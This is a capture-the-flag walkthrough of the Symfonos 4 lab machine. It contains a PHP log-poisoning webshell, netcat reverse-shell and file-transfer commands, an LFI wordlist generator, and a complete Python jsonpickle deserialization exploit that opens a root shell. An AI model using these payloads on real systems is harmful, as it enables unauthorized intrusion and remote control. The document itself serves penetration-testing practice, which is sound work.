# SYMFONOS 4

## 1 Information Gathering
## 1.1 Discovery host
`nmap -Pn -F 192.168.196.1/24 -oN host_discovery.txt`
![840e1e97c9f94578c757d7fd3c689c58.png](./_resources/349aeda966314e6f8d09bcfcbd4a1774.png)
Or you can use netdiscover.

## 1.2 Service enum
`nmap -sV -sC -p- 192.168.196.125 -oN full_service_enum-sC.txt`
![76394ae6997be19f3c4bdee0cfaa2281.png](./_resources/c691da3575884fcda97e905576d39a7e.png)

`nmap -sV -sU -F 192.168.196.125 -oN udp-sC-sV.txt`

## 1.3 Web
### 1.3.1 Gobuster enum web content
`gobuster dir -u http://192.168.196.125 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -f -x php,bkp,bak,txt,html,aspx -o gobuster/info-403.txt`

![0975e9ea8b8186843034eaa7daa54ebf.png](./_resources/08373315ed444d79bf152bbab584aea8.png)

`gobuster dir -u http://192.168.196.125 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -f -x php,bkp,bak,txt,html,aspx -o info-403.1.txt`
![c4583ba1c6c787bdd818294cb239fe8c.png](./_resources/9f42f9f33c034491b2b19c7fe9ddd362.png)

![1d8d6b711590211a52e3aa5a2e2ceb03.png](./_resources/24571ff2fe9540fb818164cacd9c1835.png)

### 1.3.2 Downloading and reading .log files
![a1c099d558fcf0a1d61e3f9a286db9df.png](./_resources/923829f107e945e6b7a41707a66f6ac7.png)
Apparently the file reader reads these .log files and exclude the extension.


# 2 Exploitation
## 2.1 Bypass login sqli
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/Intruder <- only sqli login bypass
![f05f53f61c3c9f278839e192155f60d3.png](./_resources/e0c248c955274101b329a896edecc53c.png)

![dee386e1368f678594d530ea7b687f8f.png](./_resources/21ce6dcbe9d944b8b94b6071876fb837.png)

## 2.3 LFI (local file inclusion) - using bash to generate payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders

First it needs to grep all .log files and exclude the extension.
We also need add some "../" multiplied by a looping for cases where there is no path traversal:

![1cd967f30e848870cd71ccee54ad1dd4.png](./_resources/785e5a8f11f04b97b2ab41efbbb11c09.png)

```
#!/bin/bash

a=0
rm wl-lfi-with-new-dotdot.txt

while [ $a -lt 10 ]; do 
	string=$(python2.7 -c "print $a * '../'")
	for i in $(cat /root/shared/wl-lfi.txt | grep "\.log" | sed 's/\.log//g' | grep -v "\.\." | sed 's/^\///g') ; do
		echo "$string$i" >> wl-lfi-with-new-dotdot.txt
	done
	a=$(( $a + 1 ))
done
cat wl-lfi-with-new-dotdot.txt | sort | uniq > wl-lfi-with-new-dotdot-new.txt
```

![32891abc8f6f2a29e90957c4a48df109.png](./_resources/011ff6b8d8414ce89ab3aefc33f7d4e3.png)

### 2.3.1 Reverse shell
https://vk9-sec.com/testing-lfi-to-rce-using-auth-log-ssh-poisoning-with-mutillidae-burpsuite/
https://github.com/bayufedra/Tiny-PHP-Webshell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

```
ssh '<?=`$_GET[0]`?>@192.168.196.127'
```
![bac8f31f1dbeaf07360ad7e65eb809fd.png](./_resources/2a5ac06591814144bc918c386f6e46a0.png)

![551934b56670ffd80ea92ef3d7895822.png](./_resources/d9ca224d89814bf39e9e85fdba68f82f.png)
```
GET /sea.php?file=/../var/log/auth&0=nc+192.168.196.121+4446+-e+/bin/bash
```
![41c70d61d8a0b08a44cbe0cb4cd68fee.png](./_resources/fe456d74e92b491db68c287f7dbedab2.png)
Since we have nc or any other way on target, we can use it for get reverse shell:
![e905767d0ac3bad464d5a031d815d98e.png](./_resources/0e91b6820bd04a20900f2006aad65434.png)


# 3 Post-exploitation
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
We can upload LinEnum on the target with python3 and the lib http.server:
![4d63d0022347ed21c3ba7df24c2522c0.png](./_resources/47d04bb3e5c543a4aae1de06412edae3.png)
![820b558de83960b7ef1042b7af6591e5.png](./_resources/ab77bd1365544d76b1c000435b81d303.png)
`./LinEnum.sh -t > info.txt`

And download from target:
`nc -nlvp 4447 > info.txt`
`cat info.txt | nc 192.168.196.121 4447`

![ea043ac33ffccefe0be1ce5158627f79.png](./_resources/212f5442c5874501ada84e00a16a47f0.png)

## 3.1 Remote forwarding with ssh
https://www.ssh.com/academy/ssh/tunneling/example
We need to liberate the internal port 8080 on the kali for examine it:
`ssh -fN root@192.168.196.121 -R 8888:127.0.0.1:8080`

## 3.2 Web 8080
### 3.2.1 Gobuster enum web content
`gobuster dir -u "http://localhost:8888/" -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -t 40 -x php,html,txt,bkp,bak,aspx -o info-list-1.0.txt`

![871d11e257ef55e125102ff953880218.png](./_resources/4bfaac7691be42f6a08e79d799f01959.png)

![df9bf8bf57207863f1663384960b0fec.png](./_resources/5a338a152d2b442590792a507f02c051.png)
We have a cookie with base64 encode.
Let's decode it:
![a2faa58b0d558074ef2d46ea76f628d9.png](./_resources/b8651e2ba33843d38c8ecee493831f13.png)

### 3.3.2 Python Pickle without exploit to get root
A quick search in google, reveal that the web application is using Python Pickle:
![34c46c4628137be5bc34b7590a2d1e39.png](./_resources/454c47d973674ee5a1c0fd8caca828c6.png)
This articles explain about exploit it:
https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/ 
https://www.synopsys.com/blogs/software-security/python-pickling/
https://blog.nelhage.com/2011/03/exploiting-pickle/
https://intoli.com/blog/dangerous-pickles/

You can use use burpsuit instead code an exploit:
![ce0615a224028acc4f853e5964d9aec9.png](./_resources/48add1eec8404568aa483028b4b3ffb2.png)
Needs encode to base64:

![1581ff27f0379884666328b034bca78e.png](./_resources/0fe79ecb71274e4b8eaa09a7e72de099.png)]

And rooted:

![9ff866356191b6a5f8b5598ea0661897.png](./_resources/df8406e80fa1459399853773280f05ac.png)

### 3.3.3 Python Pickle with coding exploit to get root
```
#!/usr/bin/env python3
# Exploit to vulnerable app in symfonos 4

import jsonpickle
import os
import socket
import base64
#import sys
import requests
#import subprocess

# Default target
target = 'localhost:8888'
command = 'nc 192.168.196.121 4447 -e /bin/bash'

# Class for exploitation
class Shell(object):
    def __reduce__(self):
        #return (subprocess.Popen, (('nc 192.168.196.121 4447 -e /bin/bash'),))
        return (os.system, (command,))

shell = jsonpickle.encode(Shell())
print (shell)
shell1 = (base64.b64encode(shell.encode()).decode('utf-8'))
print (shell)

cookies = {
    'username': shell1,
}
print (cookies)

headers = {
    'Host': target,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
}

response = requests.get('http://localhost:8888/whoami', headers=headers, cookies=cookies, verify=False)
print (response.content)

```

And rooted:

![7f985f49d2994f98f434e810c1788f65.png](./_resources/24c617101aa14ecfbedb88e5539534f3.png)
 
